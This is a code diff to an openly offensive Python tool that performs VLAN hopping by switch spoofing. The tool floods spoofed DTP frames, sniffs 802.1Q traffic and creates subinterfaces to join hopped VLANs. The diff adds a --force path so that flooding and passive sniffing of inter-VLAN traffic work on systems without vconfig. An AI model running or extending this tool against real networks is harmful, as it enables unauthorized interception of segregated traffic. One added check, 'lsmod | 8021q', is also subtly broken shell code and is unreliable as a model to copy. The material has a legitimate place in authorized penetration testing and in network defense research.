@@ -5,13 +5,26 @@
 # attack automatically, running sniffer afterwards to collect any other
 # VLAN available. 
 #
-# To be launched only in Unix/Linux environment as the script utilizes 
+# This script works best in Unix/Linux environment as the script utilizes 
 # following applications:
 #   - 8021q.ko
 #   - vconfig
 #   - ifconfig / ip / route
 #   - dhclient
 #   - (optional) arp-scan
+#
+# However, it should also work under non-Unix/Linux platforms or platforms not 
+# offering aforementioned depenendcies. Under such circumstances the tool behaves
+# as was described below.
+#
+# If the underlying system is not equipped with 8021q.ko and vconfig command,
+# the script will be unable to create subinterfaces for discovered VLANs which
+# also means no DHCP leases are going to be obtained. The VLAN Hopping attack
+# may still be attempted, this will result in the switch passing inter-VLAN traffic
+# to our interface to observe, but only passive sniffing will be left possible without
+# ability to create subinterfaces to interact with other VLAN networks.
+# If that limitation suits is acceptable, one can use --force option passed to this script
+# in order to proceed when no vconfig was found.
 #
 # Python requirements:
 #   - scapy
@@ -26,7 +39,7 @@
 #   - Add auto-packets capture functionality via tshark/tcpdump to specified out directory
 #   - Add functionality to auto-scan via arp-scan desired network
 #
-# Mariusz B. / mgeeky, '18, <mb@binary-offensive.com>
+# Mariusz B. / mgeeky, '18-19, <mb@binary-offensive.com>
 #
 
 import os
@@ -51,7 +64,7 @@ except ImportError:
     sys.exit(1)
 
 
-VERSION = '0.4'
+VERSION = '0.4.1'
 
 config = {
     'verbose' : False,  
@@ -69,6 +82,7 @@ config = {
 }
 
 arpScanAvailable = False
+vconfigAvailable = False
 stopThreads = False
 attackEngaged = False
 dot1qSnifferStarted = False
@@ -306,7 +320,7 @@ def engageDot1qSniffer():
 
     dot1qSnifferStarted = True
 
-    #Logger.info('Started VLAN/802.1Q sniffer.')
+    Logger.info('Started VLAN/802.1Q sniffer.')
 
     sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
     sock.bind((config['interface'], ETH_P_ALL))
@@ -347,7 +361,7 @@ def processDtps(dtps):
                     break
 
         if success:
-            #Logger.ok('VLAN Hopping via Switch Spoofing may be possible.')
+            Logger.ok('VLAN Hopping via Switch Spoofing may be possible.')
             Logger.dbg('Flooding with fake Access/Desirable DTP frames...\n')
 
             t = threading.Thread(target = floodTrunkingRequests)
@@ -359,7 +373,7 @@ def processDtps(dtps):
 
     if config['force']:
         Logger.ok('FORCED VLAN Hopping via Switch Spoofing.')
-        Logger.ok('Flooding with fake Access/Desirable DTP frames...\n')
+        Logger.dbg('Flooding with fake Access/Desirable DTP frames...\n')
 
         t = threading.Thread(target = floodTrunkingRequests)
         t.daemon = True
@@ -372,10 +386,6 @@ def processDtps(dtps):
         engageDot1qSniffer()
             
 def launchCommand(subif, cmd, forceOut = False, noCmd = False):
-    # following placeholders in command: 
-    # $GW (gateway), 
-    # $MASK (full mask), 
-
     Logger.dbg('Subinterface: {}, Parsing command: "{}"'.format(subif, cmd))   
 
     if '%IFACE' in cmd: cmd = cmd.replace('%IFACE', subif)
@@ -409,6 +419,10 @@ def addVlanIface(vlan):
     global tempfiles
 
     subif = '{}.{}'.format(config['interface'], vlan)
+    
+    if not vconfigAvailable:
+        Logger.fail('No 8021q or vconfig available. Unable to create {} subinterface and obtain DHCP lease.'.format(subif))
+        return
 
     if subif in subinterfaces:
         Logger.fail('Already created that subinterface: {}'.format(subif))
@@ -557,6 +571,7 @@ def processCdp(pkt):
                 subsequent_indent = ' ' * len(key)
             )
             out += '{}\n'.format(wrapper.fill(fmt))
+            Logger.dbg('Discovered new VLANs in CDP announcement: {} = {}'.format(tlvs[tlv.type], out.strip()))
 
     out = re.sub(r'(?:\n)+', '\n', out)
 
@@ -650,16 +665,22 @@ def changeMacAddress(iface, mac):
     return ret
 
 def assure8021qCapabilities():
+    global vconfigAvailable
+    
     if ('not found' in shell('modprobe -n 8021q')):
-        Logger.err('There is no kernel module named: "8021q". Fatal error.')
+        Logger.err('There is no kernel module named: "8021q".')
         return False
 
     if not shell('which vconfig'):
-        Logger.err('There is no "vconfig" utility. Package required: "vconfig". Fatal error.')
+        Logger.err('There is no "vconfig" utility. Package required: "vconfig".')
         return False
 
     shell('modprobe 8021q')
-
+    if not shell('lsmod | 8021q'):
+        Logger.err('Could not load kernel module named "8021q".')
+        return False
+    
+    vconfigAvailable = True
     return True
 
 def shell(cmd):
@@ -688,11 +709,12 @@ def cleanup():
         Logger.dbg('Restoring original MAC address...')
         changeMacAddress(config['interface'], config['origmacaddr'])
 
-    for subif in subinterfaces:
-        Logger.dbg('Removing subinterface: {}'.format(subif))
+    if vconfigAvailable:
+        for subif in subinterfaces:
+            Logger.dbg('Removing subinterface: {}'.format(subif))
 
-        launchCommands(subif, config['exitcommands'])
-        shell('vconfig rem {}'.format(subif))
+            launchCommands(subif, config['exitcommands'])
+            shell('vconfig rem {}'.format(subif))
 
     Logger.dbg('Removing temporary files...')
     for file in tempfiles:
@@ -702,7 +724,7 @@ def parseOptions(argv):
     print('''
         :: VLAN Hopping via DTP Trunk negotiation 
         Performs VLAN Hopping via negotiated DTP Trunk / Switch Spoofing technique
-        Mariusz B. / mgeeky '18, <mb@binary-offensive.com>
+        Mariusz B. / mgeeky '18-19, <mb@binary-offensive.com>
         v{}
 '''.format(VERSION))
 
@@ -712,7 +734,7 @@ def parseOptions(argv):
     parser.add_argument('-E', '--exit-execute', dest='exitcommand', metavar='CMD', default=[], action='append', help='Launch specified command at the end of this script (during cleanup phase).')
     parser.add_argument('-m', '--mac-address', metavar='HWADDR', dest='mac', default='', help='Changes MAC address of the interface before and after attack.')
     #parser.add_argument('-O', '--outdir', metavar='DIR', dest='outdir', default='', help='If set, enables packet capture on interface connected to VLAN Hopped network and stores in specified output directory *.pcap files.')
-    parser.add_argument('-f', '--force', action='store_true', help='Attempt VLAN Hopping even if DTP was not detected (like in Nonegotiate situation).')
+    parser.add_argument('-f', '--force', action='store_true', help='Attempt VLAN Hopping even if DTP was not detected (like in Nonegotiate situation) or the operating system does not have support for 802.1Q through "8021q.ko" kernel module and "vconfig" command. In this case, the tool will only flood wire with spoofed DTP frames which will make possible to sniff inter-VLAN traffic but no interaction can be made.')
     parser.add_argument('-a', '--analyse', action='store_true', help='Analyse mode: do not create subinterfaces, don\'t ask for DHCP leases.')
     parser.add_argument('-v', '--verbose', action='store_true', help='Display verbose output.')
     parser.add_argument('-d', '--debug', action='store_true', help='Display debug output.')
@@ -784,8 +806,12 @@ def main(argv):
     load_contrib('cdp')
 
     if not assure8021qCapabilities():
-        Logger.err('Unable to proceed.')
-        return False
+        if config['force']:
+            Logger.info('Proceeding anyway. The tool will be unable to obtain DHCP lease in hopped networks. Only passive sniffing will be possible.')
+        else:
+            Logger.err('Unable to proceed. Consider using --force option to overcome this limitation.')
+            Logger.err('In such case, the tool will only flood wire with spoofed DTP frames, which will make possible\n\tto sniff inter-VLAN traffic but no interaction can be made.\n\tThis is because the tool is unable to obtain DHCP lease for hopped networks.')
+            return False
 
     if not opts.interface:
         if not selectDefaultInterface():
